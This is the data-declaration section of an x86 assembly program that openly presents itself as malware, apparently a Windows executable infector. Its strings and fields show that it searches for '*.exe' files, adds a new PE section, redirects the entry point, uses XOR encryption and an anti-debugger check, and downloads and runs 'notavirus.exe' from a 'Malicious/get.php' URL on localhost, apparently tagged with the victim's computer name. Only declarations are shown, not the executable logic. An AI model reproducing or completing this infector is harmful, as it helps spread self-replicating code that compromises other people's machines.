; Jmp data
jmp	start

; FILE
OldProtect		dd		?
FileData		WIN32_FIND_DATA	<>
DebugDone		db		"Done", 0 ; TODO remove
SearchFolder		db		"*.exe", 0
HandleSearch		dd		?
NewSectionName		db		"ImIn", 0
XorCrypt		dd		?

; PE
OptHeaderSize		dw	?
SizeOfHeaders		dd	?
VAKernelIAT		dd	?
OffsetExitProcess	dd	?
VAIAT			dd	?
OffsetIAT		dd	?
OffsetCodeSecEP		dd	?
CodeSecRawData		dd	?
CodeSecVA		dd	?
BaseImage		dd	?
OldEntryPoint		dd	?
PeFile			dd	?
PeMapObject		dd	?
PeFileMap		dd	?
PePSectionNb		dd	?
PeNtHeader		dd	?
PeOptionalHeader	dd	?
LastSecHeader		dd	?
LastSec			dd	?
PeStartSHeader		dd	?
SectionAlignment	dd	?
FileAlignment		dd	?
NewSectionCodeSize	dd	?
VirtualAddress		dd	?
SizeOfRawData		dd	?
PointerToRawData	dd	?
CodeSecHeader		dd	?

; DLL
sVirtualProtect		db	'VirtualProtect', 0 
sCreateThread		db	'CreateThread', 0 
sWaitForSingleObject	db	'WaitForSingleObject', 0 
sGetExitCodeThread	db	'GetExitCodeThread', 0 
sIsDebuggerPresent	db	'IsDebuggerPresent', 0 
sCreateFileMapping	db	'CreateFileMappingA', 0 
sUnmapViewOfFile	db	'UnmapViewOfFile', 0 
sGetComputerName	db	'GetComputerNameA', 0
sGetVolumeInformation	db	'GetVolumeInformationA', 0
sWinHttpOpenRequest	db	'WinHttpOpenRequest', 0
sWinHttpSendRequest	db	'WinHttpSendRequest', 0
sWinHttpReadData	db	'WinHttpReadData', 0
sWinHttpCloseHandle	db	'WinHttpCloseHandle', 0
sWinHttpReceiveResponse	db	'WinHttpReceiveResponse', 0
sWinHttpQueryDataAvailable	db	'WinHttpQueryDataAvailable', 0
sCreateProcess	db	'CreateProcessA', 0
sWinHttpOpen	db	'WinHttpOpen', 0
sWinHttpConnect	db	'WinHttpConnect', 0
sGetSystemTime	db	'GetSystemTime', 0
sExitProcess	db	'ExitProcess', 0 
sExitThread	db	'ExitThread', 0 
sCreateFile	db	'CreateFileA', 0 
sMapViewOfFile	db	'MapViewOfFile', 0 
sCloseHandle	db	'CloseHandle', 0 
sWriteFile	db	'WriteFile', 0 
sGetProcAddress	db	'GetProcAddress', 0 
sMessageBox	db	'MessageBoxA', 0 
sLoadLibrary	db	'LoadLibraryA', 0 
sFindFirstFile	db	'FindFirstFileA', 0
sFindNextFile	db	'FindNextFileA', 0
sHelloWorld	db	'Hello World (MsgBox Without include lib BIATCH!)', 0
sUser32		db	'USER32.DLL', 0
sWinHttp	db	'WINHTTP.DLL', 0
sKernel32	db	'KERNEL32.DLL', 0
pGetExitCodeThread	dd	?
pVirtualProtect		dd	?
pCreateThread		dd	?
pWaitForSingleObject	dd	?
pIsDebuggerPresent	dd	? 
pCreateFileMapping	dd	?
pUnmapViewOfFile	dd	?
pGetComputerName	dd	?
pGetVolumeInformation	dd	?
pWinHttpOpenRequest	dd	?
pWinHttpSendRequest	dd	?
pWinHttpReadData	dd	?
pWinHttpReceiveResponse	dd	?
pWinHttpCloseHandle	dd	?
pWinHttpQueryDataAvailable	dd	?
pCreateProcess	dd	?
pWinHttpOpen	dd	?
pWinHttpConnect	dd	?
pGetSystemTime	dd	?
pExitProcess	dd	?
pExitThread	dd	?
pCreateFile	dd	?
pMapViewOfFile	dd	?
pCloseHandle	dd	?
pWriteFile	dd	?
pMessageBox	dd	?
pKernel32	dd	?
pUser32		dd	?
pWinHttp	dd	?
pLoadLibrary	dd	?
pGetProcAddress	dd	?
pFindFirstFile	dd	?
pFindNextFile	dd	?

; OTHERS
RetFromThread	dd	?
ThreadId	dd	?
ThreadHandle	dd	?
WUT		db	'C:\MinGW\msys\1.0\home\Shinao\Malicious\Malicious\test\notavirus.exe', 0
Number		dd	?
HttpSession	dd	?
HttpConnect	dd	?
HttpRequest	dd	?
MaliciousFile	db	'notavirus.exe', 0
MaliciousUrl	db	'M', 0, 'a', 0, 'l', 0, 'i', 0, 'c', 0, 'i', 0, 'o', 0, 'u', 0, 's', 0, '/', 0, 'g', 0, 'e', 0, 't', 0, '.', 0, 'p', 0, 'h', 0, 'p', 0, '?', 0, 'n', 0, 'a', 0, 'm', 0, 'e', 0, '=', 0
MaliciousUrl2	db	'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
MaliciousDomain	db	'l',0,'o',0,'c',0,'a',0,'l',0,'h',0,'o',0,'s',0,'t',0,0,0
ComputerName	db	"XXXXXXXXXXXXXXXXXXXX", 0
LengthName	dd	?
VolumeID	dd	?
_SYSTEMTIME	STRUC
Year		dw	?
Month		dw	?
DayOfWeek	dw	?
Day		dw	?
Hour		dw	?
Minute		dw	?
Second		dw	?
Milliseconds	dw	?
_SYSTEMTIME	ENDS
STime		_SYSTEMTIME	<>

ProcessInfo	PROCESS_INFORMATION	<0>
StartupInfo	STARTUPINFOA		<0>
